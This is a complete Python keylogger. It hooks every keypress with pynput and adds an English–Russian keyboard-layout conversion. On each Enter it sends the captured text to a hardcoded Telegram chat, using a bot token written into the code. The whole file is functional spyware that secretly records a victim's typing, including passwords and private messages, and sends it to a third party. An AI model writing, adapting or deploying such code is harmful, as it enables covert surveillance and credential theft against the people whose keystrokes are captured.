from pynput import keyboard
import telebot

data = []
eng_ru = {
    "q": "й", "w": "ц", "e": "у", "r": "к", "t": "е",
    "y": "н", "u": "г", "i": "ш", "o": "щ", "p": "з",
    "a": "ф", "s": "ы", "d": "в", "f": "а", "g": "п",
    "h": "р", "j": "о", "k": "л", "l": "д", "z": "я",
    "x": "ч", "c": "с", "v": "м", "b": "и", "n": "т",
    "m": "ь", "": "", " ": " "
}

ru_eng = {v: k for k, v in eng_ru.items()}

def send_data_to_tg(message):
    bot = telebot.TeleBot("6938919041:AAFDA3gOe8uSnneYimDP2H2jFacE7s90Des")
    # bot.reply_to(message, "Howdy, how are you doing?")
    bot.send_message(853442670, message)

def send_data():
    res = '(1)\n'
    res += ''.join(map(lambda el: el.lower(), data))
    res += '\n\n(1)\n'
    try:
        res += ''.join(map(lambda el: eng_ru.get(el.lower(), el.lower()), data))
    except Exception as e:
        res += ''.join(map(lambda el: ru_eng.get(el.lower(), el.lower()), data))

    data.clear()
    send_data_to_tg(res)

def append_data(key):
    key = str(key).replace("'", "")

    if key == "Key.enter":
        send_data()
    elif key == "Key.space":
        data.append(" ")

    if len(key) == 1:
        data.append(key)

with keyboard.Listener(on_press=append_data) as l:
    l.join()
